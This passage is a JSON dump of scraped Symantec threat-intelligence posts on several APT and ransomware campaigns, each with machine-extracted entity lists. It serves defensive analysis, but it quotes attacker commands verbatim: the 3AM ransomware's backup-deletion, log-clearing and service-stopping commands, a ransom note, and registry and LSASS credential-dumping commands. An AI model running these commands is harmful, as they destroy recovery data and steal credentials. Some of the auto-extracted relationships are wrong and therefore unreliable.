within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Iranian Crambus espionage group, Attacker), (OilRig, Threat Type), (APT34, Attacker), (PowerShell backdoor, Malware), (Plink, Tool), (Windows firewall rule modification, Technique), (Remote Desktop Protocol, Tool), (Malicious activity, Event), (Port-forwarding rule configuration, Technique), (Keylogger, Malware), (Saudi Arabia, Target), (Israel, Target), (United Arab Emirates, Target), (Iraq, Target), (Jordan, Target), (Lebanon, Target), (Kuwait, Target), (Qatar, Target), (Albania, Target), (U.S., Target), (Turkey, Target)\nRelationships: (Iranian Crambus espionage group, uses, OilRig), (Iranian Crambus espionage group, uses, APT34), (Iranian Crambus espionage group, targets, Saudi Arabia), (Iranian Crambus espionage group, targets, Israel), (Iranian Crambus espionage group, targets, United Arab Emirates), (Iranian Crambus espionage group, targets, Iraq), (Iranian Crambus espionage group, targets, Jordan), (Iranian Crambus espionage group, targets, Lebanon), (Iranian Crambus espionage group, targets, Kuwait), (Iranian Crambus espionage group, targets, Qatar), (Iranian Crambus espionage group,",
      "entities": [
        [
          "Iranian Crambus espionage group",
          "Attacker"
        ],
        [
          "OilRig",
          "Threat Type"
        ],
        [
          "APT34",
          "Attacker"
        ],
        [
          "PowerShell backdoor",
          "Malware"
        ],
        [
          "Plink",
          "Tool"
        ],
        [
          "Windows firewall rule modification",
          "Technique"
        ],
        [
          "Remote Desktop Protocol",
          "Tool"
        ],
        [
          "Malicious activity",
          "Event"
        ],
        [
          "Port-forwarding rule configuration",
          "Technique"
        ],
        [
          "Keylogger",
          "Malware"
        ],
        [
          "Saudi Arabia",
          "Target"
        ],
        [
          "Israel",
          "Target"
        ],
        [
          "United Arab Emirates",
          "Target"
        ],
        [
          "Iraq",
          "Target"
        ],
        [
          "Jordan",
          "Target"
        ],
        [
          "Lebanon",
          "Target"
        ],
        [
          "Kuwait",
          "Target"
        ],
        [
          "Qatar",
          "Target"
        ],
        [
          "Albania",
          "Target"
        ],
        [
          "U.S.",
          "Target"
        ],
        [
          "Turkey",
          "Target"
        ]
      ],
      "relationships": [
        [
          "Iranian Crambus espionage group",
          "uses",
          "OilRig"
        ],
        [
          "Iranian Crambus espionage group",
          "uses",
          "APT34"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Saudi Arabia"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Israel"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "United Arab Emirates"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Iraq"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Jordan"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Lebanon"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Kuwait"
        ],
        [
          "Iranian Crambus espionage group",
          "targets",
          "Qatar"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 21,
    "relationship_count": 10
  },
  {
    "title": "grayling taiwan cyber attacks",
    "link": "https://www.security.com/threat-intelligence/grayling-taiwan-cyber-attacks",
    "content": "A previously unknown advanced persistent threat (APT) group used custom malware and multiple publicly available tools to target a number of organizations in the manufacturing, IT, and biomedical sectors in Taiwan. A government agency located in the Pacific Islands, as well as organizations in Vietnam and the U.S., also appear to have been hit as part of this campaign. This activity began in February 2023 and continued until at least May 2023. The Symantec Threat Hunter Team, part ofBroadcom, has attributed this activity to a new group we are calling Grayling. This activity stood out due to the use by Grayling of a distinctive DLL sideloading technique that uses a custom decryptor to deploy payloads. The motivation driving this activity appears to be intelligence gathering. There are indications that Grayling may exploit public facing infrastructure for initial access to victim machines. Web shell deployment was observed on some victim computers prior to DLL sideloading activity taking place. DLL sideloading is used to load a variety of payloads, including Cobalt Strike, NetSpy, and the Havoc framework. The attackers take various actions once they gain initial access to victims’ computers, including escalating privileges, network scanning, and using downloaders. Tactics, techniques, and procedures (TTPs) used by the attackers included: The typical attack chain in this activity appears to be DLL sideloading through exported API SbieDll_Hook. This leads to the loading of various tools, including a Cobalt Strike Stager that leads to Cobalt Strike Beacon, the Havoc framework, and NetSpy. The attackers were also seen loading and decrypting an unknown payload from imfsb.ini. An exploit for CVE-2019-0803 was also used in the course of this activity, while shellcode was also downloaded and executed. Other post-exploitation activity performed by these attackers includes using kill processes to kill all processes listed in a file called processlist.txt, and downloading the publicly available credential-dumping tool Mimikatz. While we do not see data being exfiltrated from victim machines, the activity we do see and the tools deployed point to the motivation behind this activity being intelligence gathering. The sectors the victims operate in – manufacturing, IT, biomedical, and government – are also sectors that are most likely to be targeted for intelligence gathering rather than for financial reasons. The use of custom techniques combined with publicly available tools is typical of the activity we see from APT groups these days, with threat actors often using publicly available or living-off-the-land tools in attempts to bypass security software and help their activity stay under the radar of defenders. Tools like Havoc and Cobalt Strike are also frequently used by attackers due to their wide array of capabilities. It is often easier for even skilled attackers to use existing tools like this than to develop custom tools of their own with similar capabilities. The use of publicly available tools can also make attribution of activity more difficult for investigators. The steps taken by the attackers, such as killing processes etc., also indicate that keeping this activity hidden was a priority for them. We have not been able to definitively link Grayling to a specific geography, but the heavy targeting of Taiwanese organizations does indicate that they likely operate from a region with a strategic interest in Taiwan. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. da670d5acf3648b0deaecb64710ae2b7fc41fc6ae8ab8343a1415144490a9ae9 – Havoc framework79b0e6cd366a15848742e26c3396e0b63338ead964710b6572a8582b0530db17 – Downloaderbf1665c949935f3a741cfe44ab2509ec3751b9384b9eda7fb31c12bfbb2a12ec – Downloaderc2a714831d8a7b0223631eda655ce62ff3c262d910c0a2ed67c5ca92ef4447e3 – Cobalt Strike Beacon667624b10108137a889f0df8f408395ae332cc8d9ad550632a3501f6debc4f2c – Exploit for CVE-2019-080387a7e428d08ecc97201cc8f229877a6202545e562de231a7b4cab4d9b6bbc0f8 – Downloader90de98fa17294d5c918865dfb1a799be80c8771df1dc0ec2be9d1c1b772d9cf0 – Loader8b6c559cd145dca015f4fa06ef1c9cd2446662a1e62eb51ba2c86f4183231ed2 – Cobalt Strike Stagerd522bf1fb3b869887eaf54f6c0e52d90514d7635b3ff8a7fd2ce9f1d06449e2c – NetSpy4fbe8b69f5c001d00bd39e4fdb3058c96ed796326d6e5e582610d67252d11aba – DLL file9bad71077e322031c0cf7f541d64c3fed6b1dc7c261b0b994b63e56bc3215739 – NetSpyf2aaedb17f96958c045f2911655bfe46f3db21a2de9b0d396936ef6e362fea1b – Downloader525417bdd5cdd568605fdbd3dc153bcc20a4715635c02f4965a458c5d008eba9 – Downloader23e5dfaf60c380837beaddaaa9eb550809cd995f2cda99e3fe4ca8b281d770ae – Downloader6725e38cbb15698e957d50b8bc67bd66ece554bbf6bcb90e72eaf32b1d969e50 – Downloader5ef2e36a53c681f6c64cfea16c2ca156cf468579cc96f6c527eca8024bfdc581 – Downloader 12924d7371310c49b1a215019621597926ef3c0b4649352e032a884750fab746 – Windumpab09e8cac3f13dea5949e7a2eaf9c9f98d3e78f3db2f140c7d85118b9bc6125fc76ba3eb764706a32013007c147309f0be19efff3e6a172393d72d46631f712e245016ace30eda7650f6bb3b2405761a6a5ff1f44b94159792a6eb64ced023aa4c44efc7d9f4cd71c43c6596c62b91740eb84b7eb9b8cf22c7034b75b5f432d9e75f2cee98c4b068a2d9e7e77599998196fd718591d3fa23b8f684133d1715c3f3e8f2ef4ad949a0ada037f52f4c0e6000d111a4ac813e64138f0ded865e6e31971ab5d4f0ec58fa1db61622a735a51e14e70ee5d99ab3cd554e0070b248eb1ff1764f8c6fc428237ffafeb08eb0503558c68c6ccf6f2510a2ef8c574ba347e0c24b19e7ccd965dfeed553c94b093533e527c55d5adbc9f0e87815d477924be5af26d07754c8d4d1cb88195f7dc53e2e4ebee382c5b84fc54a81ba1cee4d08891f15c3ae1ce442a67e3d01ed291604bfc1cb196454b717e4fb5ac52daa37ecce7ea706d8da9d68e1214e30c6373713da3585df8a337bc64fcc154fc5363f5f1f30130ea1ab762c155289a32db810168f59c3d37b69bcbedfd284c4a861d749d674cbde4d4b4ac4cae943831035bff90814fa54fd21c3a6a6ec16e7e3fb235f87752018c117e07f5d58eed35622777e971a5f495184df1c25041ff525ca72acea6a8c39e4c543e94f6e4901d0facee7793f932cd2351259d8054981cf2b4da814803d0d07d64010b102413da61bbf7b4d378891e2a46848b88ef69ca9357e37217c1b20de1f170cfaf3e75ebc7e81860378e353c84469795a162cd3cfd7263ba2a180e67fcaf2254b18eafdc95b83038e9a4385b1a5c2651651d9d288fa0500fede500875266fd18c76959839e8c6b075e4408dcbc0b620f7544f28978b852c1c1ed1b6a06abbab98471d5af33e242acc76d17b41c6e96cce0938a05703b58b91ba8a7af30e02bd45e3570de20777ab7c1eec4797919bfcd39dde681eb69b9faf1b72410e8e6ef0eb3e0f950ec4ced1be0ee6ac0a9349c8280cd8d12cc00850f9dcadcac4c57df4e31dd7094ae96657f54b22c87233e8277a2c40ba56eafcf548d0e1724360e0ae11364d3ac0eb8518ecf5d859128d094e9241d8e6feb43a9f29b19ccfa8bc75ce4cf29eb52d4afe79fe7c3819ac08b68bd87b35225a762112ba6e5d840ddeedc3b691e11a286acd7b6c087a91af27c00044dd1d951da58930683acfe90afa3cbb974e219a5ab8a9ee8c933b397d1c1c97d6e12015726b109f1b5ed10f2564cd60d02666637e9eac36db36f3a13906b851ec1207c7df620d8970 Domaind3ktcnc1w6pd1f.cloudfront[.]net IP addresses172.245.92[.]2073.0.93[.]185 URLshttp://45.148.120[.]23:91/version.dllhttp://45.148.120[.]23:91/vmtools.exe The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Grayling, Attacker), (custom malware, Malware), (publicly available tools, Tool), (DLL sideloading, Technique), (web shell, File), (Cobalt Strike, Tool), (NetSpy, Tool), (Havoc framework, Tool), (API SbieDll_Hook, Technique), (initial access, Target), (network scanning, TTP), (downloaders, Tool)\nRelationships: (Grayling, uses, custom malware), (Grayling, uses, publicly available tools), (Grayling, uses, DLL sideloading), (Grayling, uses, web shell), (Grayling, uses, Cobalt Strike), (Grayling, uses, NetSpy), (Grayling, uses, Havoc framework), (Grayling, executes, API SbieDll_Hook), (Grayling, targets, initial access), (Grayling, performs, network scanning), (Grayling, employs, downloaders)",
      "entities": [
        [
          "Grayling",
          "Attacker"
        ],
        [
          "custom malware",
          "Malware"
        ],
        [
          "publicly available tools",
          "Tool"
        ],
        [
          "DLL sideloading",
          "Technique"
        ],
        [
          "web shell",
          "File"
        ],
        [
          "Cobalt Strike",
          "Tool"
        ],
        [
          "NetSpy",
          "Tool"
        ],
        [
          "Havoc framework",
          "Tool"
        ],
        [
          "API SbieDll_Hook",
          "Technique"
        ],
        [
          "initial access",
          "Target"
        ],
        [
          "network scanning",
          "TTP"
        ],
        [
          "downloaders",
          "Tool"
        ]
      ],
      "relationships": [
        [
          "Grayling",
          "uses",
          "custom malware"
        ],
        [
          "Grayling",
          "uses",
          "publicly available tools"
        ],
        [
          "Grayling",
          "uses",
          "DLL sideloading"
        ],
        [
          "Grayling",
          "uses",
          "web shell"
        ],
        [
          "Grayling",
          "uses",
          "Cobalt Strike"
        ],
        [
          "Grayling",
          "uses",
          "NetSpy"
        ],
        [
          "Grayling",
          "uses",
          "Havoc framework"
        ],
        [
          "Grayling",
          "executes",
          "API SbieDll_Hook"
        ],
        [
          "Grayling",
          "targets",
          "initial access"
        ],
        [
          "Grayling",
          "performs",
          "network scanning"
        ],
        [
          "Grayling",
          "employs",
          "downloaders"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 11
  },
  {
    "title": "budworm tool update telecoms govt",
    "link": "https://www.security.com/threat-intelligence/budworm-tool-update-telecoms-govt",
    "content": "The Budworm advanced persistent threat (APT) group continues to actively develop its toolset. Most recently, the Threat Hunter Team in Symantec, part ofBroadcom, discovered Budworm using an updated version of one of its key tools to target a Middle Eastern telecommunications organization and an Asian government. Both attacks occurred in August 2023. Budworm (aka LuckyMouse, Emissary Panda, APT27) deployed a previously unseen variant of its SysUpdate backdoor (SysUpdate DLL inicore_v2.3.30.dll). SysUpdate is exclusively used by Budworm. As well as its custom malware, Budworm also used a variety of living-off-the-land and publicly available tools in these attacks. It appears the activity by the group may have been stopped early in the attack chain as the only malicious activity seen on infected machines is credential harvesting. Budworm executes SysUpdate on victim networks by DLL sideloading the payload using the legitimate INISafeWebSSO application. This technique has been used by the groupfor some time, with reports of INISafeWebSSO being leveraged dating as far back as 2018. DLL sideloading attacks use the DLL search order mechanism in Windows to plant and then invoke a legitimate application that executes a malicious payload. It can help attackers evade detection. SysUpdate is a feature-rich backdoor that has multiple capabilities, including: Trend Micro reported in March 2023that Budworm had developed a Linux version of SysUpdate with similar capabilities to the Windows version. SysUpdate has been in use by Budworm since at least 2020, and the attackers appear to continually develop the tool to improve its capabilities and avoid detection. As well as SysUpdate, the attackers used a number of legitimate or publicly available tools to map the network and dump credentials. Tools used by the attackers in this campaign included: Budworm is a long-running APT group that is believed to have been active since at least 2013. The attackers are known for their targeting of high-value victims, often focusing on organizations in the government, technology, and defense sectors. Budworm has targeted victims in many countries in Southeast Asia and the Middle East, among other locations, including the U.S.Symantec’s Threat Hunter Team published a blog in October 2022detailing how Budworm activity was seen on the network of a U.S. state legislature. In that campaign, the attackers also targeted the government of a Middle Eastern country, a multinational electronics manufacturer, and a hospital in Southeast Asia. The attackers also leveraged DLL sideloading in that campaign to load their HyperBro malware. The victims in this campaign — a government in Asia and a telecommunications company in the Middle East — do align with the kinds of victims we often see Budworm targeting. The targeting of a telecommunications company and government also point to the motivation behind the campaign being intelligence gathering, which is the motivation that generally drives Budworm activity. That Budworm continues to use a known malware (SysUpdate), alongside techniques it is known to favor, such as DLL sideloading using an application it has used for this purpose before, indicate that the group isn’t too concerned about having this activity associated with it if it is discovered. The use of a previously unseen version of the SysUpdate tool also demonstrates that the group is continuing to actively develop its toolset. The fact that this activity occurred as recently as August 2023 suggests that the group is currently active, and that those organizations that may be of interest to Budworm should be aware of this activity and the group’s current toolset. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. c501203ff3335fbfc258b2729a72e82638719f60f7e6361fc1ca3c8560365a0e — Legitimate INISafeWebSSO application c4f7ec0c03bcacaaa8864b715eb617d5a86b5b3ca6ee1e69ac766773c4eb00e6 — SysUpdate backdoor 551397b680da0573a85423fbb0bd10dac017f061a73f2b8ebc11084c1b364466 — Password dumper df571c233c3c10462f4d88469bababe4c57c21a52cca80f2b1e1af848a2b4d23 — Hacktool c3405d9c9d593d75d773c0615254e69d0362954384058ee970a3ec0944519c37 — SecretsDump f157090fd3ccd4220298c06ce8734361b724d80459592b10ac632acc624f455e — AdFind ee9dfcea61282b4c662085418c7ad63a0cbbeb3a057b6c9f794bb32455c3a79e — Curl The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (Budworm, Attacker), (SysUpdate, Malware), (INISafeWebSSO, Tool), (DLL sideloading, Technique)\nRelationships: (Budworm, uses, SysUpdate), (Budworm, uses, INISafeWebSSO), (Budworm, employs, DLL sideloading)",
      "entities": [
        [
          "Budworm",
          "Attacker"
        ],
        [
          "SysUpdate",
          "Malware"
        ],
        [
          "INISafeWebSSO",
          "Tool"
        ],
        [
          "DLL sideloading",
          "Technique"
        ]
      ],
      "relationships": [
        [
          "Budworm",
          "uses",
          "SysUpdate"
        ],
        [
          "Budworm",
          "uses",
          "INISafeWebSSO"
        ],
        [
          "Budworm",
          "employs",
          "DLL sideloading"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 4,
    "relationship_count": 3
  },
  {
    "title": "3am ransomware lockbit",
    "link": "https://www.security.com/threat-intelligence/3am-ransomware-lockbit",
    "content": "A new ransomware family calling itself 3AM has emerged. To date, the ransomware has only been used in a limited fashion. Symantec’s Threat Hunter Team, part of Broadcom, has seen it used in a single attack by a ransomware affiliate that attempted to deploy LockBit on a target’s network and then switched to 3AM when LockBit was blocked. 3AM is written in Rust and appears to be a completely new malware family. The ransomware attempts to stop multiple services on the infected computer before it begins encrypting files. Once encryption is complete, it attempts to delete Volume Shadow (VSS) copies. It is still unclear whether its authors have any links to known cybercrime organizations. The first suspicious activity from the threat actor involved the use of the gpresult command to dump the policy settings enforced on the computer for a specified user. The attacker also executed various Cobalt Strike components and tried to escalate privileges on the computer using PsExec. The attackers then ran reconnaissance commands such as whoami, netstat, quser, and net share, and tried to enumerate other servers for lateral movement with the quser and net view commands. They also added a new user for persistence and used the Wput tool to exfiltrate the victims’ files to their own FTP server. The attackers first attempted to use the LockBit ransomware but when that was blocked, they resorted to 3AM instead. The use of 3AM was only partially successful. The attackers only managed to deploy it to three machines on the organization's network and it was blocked on two of those three computers. 3AM is so-called because it appends encrypted files with the extension .threeamtime. The ransom note also makes reference to 3AM: Hello. \"3 am\" The time of mysticism, isn't it? All your files are mysteriously encrypted, and the systems \"show no signs of life\", the backups disappeared. But we can correct this very quickly and return all your files and operation of the systems to original state. All your attempts to restore data by himself will definitely lead to their damage and the impossibility of recovery. We are not recommended to you to do it on our own!!! (or do at your own peril and risk). There is another important point: we stole a fairly large amount of sensitive data from your local network: financial documents; personal information of your employees, customers, partners; work documentation, postal correspondence and much more. We prefer to keep it secret, we have no goal to destroy your business. Therefore can be no leakage on our part. We propose to reach an agreement and conclude a deal. Otherwise, your data will be sold to DarkNet/DarkWeb. One can only guess how they will be used. Please contact us as soon as possible, using Tor-browser: http://threeam7[REDACTED].onion/recovery [32 CHARS SPECIFIED BY -k COMMAND LINE PARAMETER] The ransomware is a 64-bit executable written in Rust and it recognises the following command-line parameters: The command-line parameters \"-m\" and \"-h\" are mutually exclusive. The usage of the “-h” and “-m” parameters and its values “local” and “net” are very similar to arguments used by Conti. When the malware is executed, it attempts to run the following commands, most of which attempt to stop various security and backup related software: \"netsh.exe\" advfirewall firewall set rule \"group=”Network Discovery”\" new enable=Yes \"wbadmin.exe\" delete systemstatebackup -keepVersions:0 -quiet \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP \"wbadmin.exe\" DELETE SYSTEMSTATEBACKUP -deleteOldest \"bcdedit.exe\" /set {default} recoveryenabled No \"bcdedit.exe\" /set {default} bootstatuspolicy ignoreallfailures \"wmic.exe\" SHADOWCOPY DELETE /nointeractive \"cmd.exe\" /c wevtutil cl security \"cmd.exe\" /c wevtutil cl system \"cmd.exe\" /c wevtutil cl application \"net\" stop /y xchange \"net\" stop /y acronis \"net\" stop /y AcronisAgent \"net\" stop /y AcrSch2Svc \"net\" stop /y Enterprise \"net\" stop /y VeeamTransportSvc \"net\" stop /y VeeamNFSSvc \"net\" stop /y DCAgent \"net\" stop /y EPSecurity \"net\" stop /y EPUpdate \"net\" stop /y EsgShKernel \"net\" stop /y FA_Scheduler \"net\" stop /y IISAdmin \"net\" stop /y Endpoint \"net\" stop /y McShield \"net\" stop /y Exchange \"net\" stop /y Monitor \"net\" stop /y Smcinst \"net\" stop /y SmcService \"net\" stop /y ccEvtMgr \"net\" stop /y ccSetMgr \"net\" stop /y TrueKey \"net\" stop /y tmlisten \"net\" stop /y UIODetect \"net\" stop /y NetMsmq \"net\" stop /y EhttpSrv \"net\" stop /y ESHASRV \"net\" stop /y klnagent \"net\" stop /y wbengine \"net\" stop /y mfefire \"net\" stop /y GxCIMgr \"net\" stop /y BackupExecVSSProvider \"net\" stop /y BackupExecManagementService \"net\" stop /y BackupExecJobEngine \"net\" stop /y BackupExecDiveciMediaService \"net\" stop /y BackupExecAgentBrowser \"net\" stop /y BackupExecAgentAccelerator \"net\" stop /y BacupExecRPCService \"net\" stop /y CASAD2WebSvc \"net\" stop /y CAARCUpdateSvc \"net\" stop /y YooBackup The ransomware will then scan the disk and any files matching predefined criteria are encrypted and the original files are deleted. The malware will then create the file \"RECOVER-FILES.txt\" in each scanned folder. This file contains the ransom note. The encrypted files contain a marker string \"0x666\" followed by the data appended by the ransomware. After encryption, the malware attempts to run the following command to delete volume shadow backup copies: vssadmin.exe delete shadows /all /quiet Ransomware affiliates have become increasingly independent from ransomware operators and this isnot the first time Symantec has seen an attacker attempt to deploy two different kinds of ransomwarein a single attack. New ransomware families appear frequently and most disappear just as quickly or never manage to gain significant traction. However, the fact that 3AM was used as a fallback by a LockBit affiliate suggests that it may be of interest to attackers and could be seen again in the future. For the latest protection updates, please visit theSymantec Protection Bulletin. If an IOC is malicious and the file available to us, Symantec Endpoint products will detect and block that file. 079b99f6601f0f6258f4220438de4e175eb4853649c2d34ada72cce6b1702e22 – LockBit 307a1217aac33c4b7a9cd923162439c19483e952c2ceb15aa82a98b46ff8942e – 3AM 680677e14e50f526cced739890ed02fc01da275f9db59482d96b96fbc092d2f4 – Cobalt Strike 991ee9548b55e5c815cc877af970542312cff79b3ba01a04a469b645c5d880af – Cobalt Strike ecbdb9cb442a2c712c6fb8aee0ae68758bc79fa064251bab53b62f9e7156febc – Cobalt Strike The Threat Hunter Team is a group of security experts within Broadcom whose mission is to investigate targeted attacks, drive enhanced protection in Symantec and Carbon Black products, and offer analysis that helps customers respond to attacks. We encourage you to share your thoughts on your favorite social platform.",
    "extraction": {
      "raw_output": "Named Entities: (ransomware, Threat Type), (LockBit, Malware), (3AM, Malware), (Cobalt Strike, Tool), (Wput, Tool), (FTP server, Domain), (Windows PowerShell, Tool), (whoami, Command), (netstat, Command), (quser, Command), (net share, Command), (Net View, Command)\nRelationships: (ransomware, uses, LockBit), (ransomware, uses, 3AM), (LockBit, deployedBy, ransomware affiliate), (ransomware, uses, Cobalt Strike), (ransomware, uses, Wput), (ransomware, uses, FTP server), (ransomware, uses, Windows PowerShell), (ransomware, uses, whoami), (ransomware, uses, netstat), (ransomware, uses, quser), (ransomware, uses, net share), (ransomware, uses, Net View), (ransomware, uses, Wput), (ransomware, uses, FTP server), (ransomware, uses, Windows PowerShell), (ransomware, uses, whoami), (ransomware, uses, netstat), (ransomware, uses, quser), (ransomware, uses, net share), (ransomware, uses, Net View), (ransomware, uses, Wput), (ransom",
      "entities": [
        [
          "ransomware",
          "Threat Type"
        ],
        [
          "LockBit",
          "Malware"
        ],
        [
          "3AM",
          "Malware"
        ],
        [
          "Cobalt Strike",
          "Tool"
        ],
        [
          "Wput",
          "Tool"
        ],
        [
          "FTP server",
          "Domain"
        ],
        [
          "Windows PowerShell",
          "Tool"
        ],
        [
          "whoami",
          "Command"
        ],
        [
          "netstat",
          "Command"
        ],
        [
          "quser",
          "Command"
        ],
        [
          "net share",
          "Command"
        ],
        [
          "Net View",
          "Command"
        ]
      ],
      "relationships": [
        [
          "ransomware",
          "uses",
          "LockBit"
        ],
        [
          "ransomware",
          "uses",
          "3AM"
        ],
        [
          "LockBit",
          "deployedBy",
          "ransomware affiliate"
        ],
        [
          "ransomware",
          "uses",
          "Cobalt Strike"
        ],
        [
          "ransomware",
          "uses",
          "Wput"
        ],
        [
          "ransomware",
          "uses",
          "FTP server"
        ],
        [
          "ransomware",
          "uses",
          "Windows PowerShell"
        ],
        [
          "ransomware",
          "uses",
          "whoami"
        ],
        [
          "ransomware",
          "uses",
          "netstat"
        ],
        [
          "ransomware",
          "uses",
          "quser"
        ],
        [
          "ransomware",
          "uses",
          "net share"
        ],
        [
          "ransomware",
          "uses",
          "Net View"
        ],
        [
          "ransomware",
          "uses",
          "Wput"
        ],
        [
          "ransomware",
          "uses",
          "FTP server"
        ],
        [
          "ransomware",
          "uses",
          "Windows PowerShell"
        ],
        [
          "ransomware",
          "uses",
          "whoami"
        ],
        [
          "ransomware",
          "uses",
          "netstat"
        ],
        [
          "ransomware",
          "uses",
          "quser"
        ],
        [
          "ransomware",
          "uses",
          "net share"
        ],
        [
          "ransomware",
          "uses",
          "Net View"
        ],
        [
          "ransomware",
          "uses",
          "Wput"
        ]
      ],
      "has_entities": true
    },
    "entity_count": 12,
    "relationship_count": 21
  },
  {
    "title": "critical infrastructure attacks",
    "link": "https://www.security.com/threat-intelligence/critical-infrastructure-attacks",
    "content": "Espionage actors are continuing to mount attacks on critical national infrastructure (CNI) targets, a trend that has become a source of concern for governments and CNI organizations worldwide. Symantec’s Threat Hunter Team has found evidence that a threat actor group Symantec calls Redfly used the ShadowPad Trojan to compromise a national grid in an Asian country for as long as six months earlier this year. The attackers managed to steal credentials and compromise multiple computers on the organization’s network. The attack is the latest in a series of espionage intrusions against CNI targets. In May 2023, the U.S., UK, Australian, Canadian, and New Zealand governmentsissued a joint alertabout threat actors targeting CNI organizations in the U.S. using techniques that could potentially be replicated against targets in other countries. The alert followedMicrosoft’s report on Volt Typhoon, an espionage actor that compromised several critical infrastructure organizations in the U.S. ShadowPad is a modular remote access Trojan (RAT) that was designed as a successor to the Korplug/PlugX Trojan, and was, for a period of time, sold in underground forums. However, despite its origins as a publicly available tool, it was only sold publicly for a very short time reportedly to a handful of buyers. It has since beenclosely linked to espionage actors. While ShadowPad is known to be used by multiple advanced persistent threat (APT) actors, identified tools and infrastructure used in the recent campaign targeting a national power grid overlaps with previously reported attacks attributed to a cluster of APT41 activity (aka Brass Typhoon, Wicked Panda, Winnti, and Red Echo). Symantec tracks this group under as multiple distinct actors such as Blackfly and Grayfly, where links between these groups have beendiscussed before. The activities identified in this campaign are currently being tracked under a separate group that Symantec has dubbed Redfly, which appears to exclusively focus on targeting CNI. A distinct variant of the ShadowPad Trojan was used in this attack. It utilized the domain websencl[.]com for command-and-control (C&C) purposes. It copied itself to disk in the following locations, masquerading as VMware files and directories to mask its purpose (there is no other evident association with VMware products): Persistence is achieved by creating the following service that is configured to start with Windows on boot-up: ServiceName: VMware Snapshot Provider Service DisplayName: VMware Snapshot Provider Service ServiceType: SERVICE_WIN32_OWN_PROCESS|SERVICE_INTERACTIVE_PROCESS StartType: SERVICE_AUTO_START BinaryPathName: C:\\ProgramData\\VMware\\RawdskCompatibility\\virtual\\vmrawdsk.exe This is a tool used to load and execute shellcode. The shellcode is stored in a file in an encrypted form. It allows the attackers to deliver and execute arbitrary files or commands on an infected computer. The tool is a 64-bit dynamic link library (DLL) that has one export, called WorkProc, which accepts an additional command-line argument. This argument is interpreted as a string and can be used as a decryption key. If no key is passed on the command line, the malware attempts to retrieve a key from the following registry location instead: In all cases, the malware checks that the string length of the decryption secret is 0x20 characters. The malware then loads its payload. It will first check if the following file exists: If the file exists, its contents are used as the encrypted payload. Otherwise, the malware attempts to retrieve a payload from the registry at the following location: The malware will then decrypt the loaded payload with the Advanced Encryption Standard (AES) algorithm in Electronic Code Book (ECB) mode using the first 0x10 bytes of the decryption key as the AES key. Finally, it creates a new thread to execute the decrypted payload as shellcode. The attackers also employed a keylogger, which was installed under various file names on different computers, including winlogon.exe and hphelper.exe. The keylogger was configured to store captured keystrokes in the following location: The first evidence of intrusion on the targeted network dated from February 28, 2023, when ShadowPad was executed on a single computer. It was executed again on May 17 2023, suggesting that the attackers had maintained a presence in the intervening three months. A day earlier (May 16), a suspicious Windows batch file (file name: 1.bat) was executed. Shortly afterwards, PackerLoader was executed via rundll32 from the %TEMP% directory with some command-line arguments: rundll32 %TEMP\\%packerloader.dll WorkProc E10ADC3949BA59ABBE56E057F20F883E Immediately afterwards, permissions were modified for a driver file called dump_diskfs.sys to grant access to all users. It is possible the attackers used this driver to create dumps of the file system for later exfiltration. Four minutes later, credentials were dumped from the Windows registry: reg save HKLM\\SYSTEM system.save reg save HKLM\\SAM sam.sav reg save HKLM\\SECURITY security.save On May 19, the attackers returned, running PackerLoader and the 1.bat batch file again. Shortly afterwards, a legitimate binary named displayswitch.exe was executed. It was likely being used to perform DLL side-loading. This involves the attackers placing a malicious DLL in a directory where a legitimate DLL is expected to be found. The attacker then runs the legitimate application (having installed it themselves). The legitimate application then loads and executes the payload. Several hours later a suspicious PowerShell command was executed and used to gather information on the storage devices attached to the system. Specifically it was designed to look for DriveType=3 (Read/Write Supported) and gather details on available space. powershell -executionpolicy ByPass -command \"$disks = Get-WmiObject Win32_LogicalDisk -Filter \\\" DriveType = 3\\\" ; foreach ($disk in $disks) { $freeSpace = \\\"{0:N2}\\\" -f ($disk.FreeSpace/1GB) ; Write-Host \\\"Drive Free Space: $($disk.DeviceID) $freeSpace\\\"; }\" Several hours later, a similar set of activity occurred again. On May 26, displayswitch.exe was executed from the %TEMP% directory via the command prompt. Less than an hour later, several commands were executed via displayswitch.exe to dump credentials from the registry and clear the Windows security event logs: reg save HKLM\\SAM sam.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SYSTEM system.save reg save HKLM\\SECURITY security.save reg save HKLM\\SAM sam.save reg save HKLM\\SECURITY security.save On May 29, the attackers returned and used a renamed version of ProcDump (file name: alg.exe) to dump credentials from LSASS. alg.exe -accepteula -ma lsass.exe z1.dmp On May 31, a scheduled task is used to execute oleview.exe, mostly likely to perform side-loading and laterally movement. Use of Oleview by ShadowPad has beenpreviously documented by Dell Secureworksand was also reported to have been used in attacks against industrial control systems. The command specified that Oleview was to be executed on a remote machine using the task name (TendView) at 07:30 a.m. It appears the attackers likely used stolen credentials in order to spread their malware onto other machines within the network. schtasks /create /s \\\\[REMOVED] /u [REMOVED] /P [REMOVED] /tr \"CSIDL_PROFILE\\[REMOVED]\\appdata\\local\\temp\\oleview.exe\" 